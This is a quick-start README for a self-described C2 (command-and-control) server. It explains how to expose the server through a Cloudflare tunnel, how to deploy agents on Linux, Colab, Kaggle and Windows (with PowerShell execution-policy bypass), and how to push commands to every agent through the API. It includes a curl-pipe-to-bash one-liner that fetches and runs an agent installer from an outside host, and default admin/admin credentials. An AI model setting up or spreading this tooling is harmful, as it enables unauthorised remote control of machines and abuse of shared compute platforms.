# Quick Start Guide

**🌐 Public URL:** https://gbctwoserver.pages.dev

---

## 🚀 One-Command Start

```bash
./start.sh
```

This automatically:
- Starts the server
- Creates Cloudflare Tunnel
- Gets public URL
- Updates README with current URL

---

## 📱 Access Dashboard

**URL:** https://gbctwoserver.pages.dev

**Login:**
- Username: `admin`
- Password: `admin`

---

## 🤖 Deploy Agents

### Linux/macOS/Colab/Kaggle
```bash
C2_URL=https://gbctwoserver.pages.dev \
python -m src.agents.universal
```

### Windows (PowerShell)
```powershell
$env:C2_URL="https://gbctwoserver.pages.dev"
powershell -ExecutionPolicy Bypass -File src\agents\windows.ps1
```

### One-Liner (Linux)
```bash
curl -sSL https://gbctwoserver.pages.dev/api/agent/install | bash
```

---

## 📡 API Access

### Health Check
```bash
curl https://gbctwoserver.pages.dev/api/health
```

### List Agents
```bash
curl -u admin:admin https://gbctwoserver.pages.dev/api/agents
```

### Send Command
```bash
curl -X POST https://gbctwoserver.pages.dev/api/task/create \
  -H "Content-Type: application/json" \
  -d '{"agent_id":"all","command":"whoami"}'
```

---

## 🔄 Restart Everything

```bash
# Stop
pkill -f "python.*run_unified"
pkill cloudflared

# Start
./start.sh
```

---

## 📝 Notes

- **URL changes on restart** (quick tunnel)
- For permanent URL, create Cloudflare account and named tunnel
- Server runs on localhost:5000
- Tunnel forwards public URL to localhost

---

## 🛠️ Troubleshooting

### Server not starting
```bash
# Check port
lsof -i :5000
# Kill existing
pkill -f "python.*run_unified"
```

### Tunnel not working
```bash
# Check cloudflared
which cloudflared
# Install if missing
curl -L https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o /tmp/cloudflared
chmod +x /tmp/cloudflared
sudo mv /tmp/cloudflared /usr/local/bin/
```

### Agent not connecting
```bash
# Test connectivity
curl https://gbctwoserver.pages.dev/api/health
```

---

**Status:** Production Ready ✅  
**Last Updated:** 2026-03-25
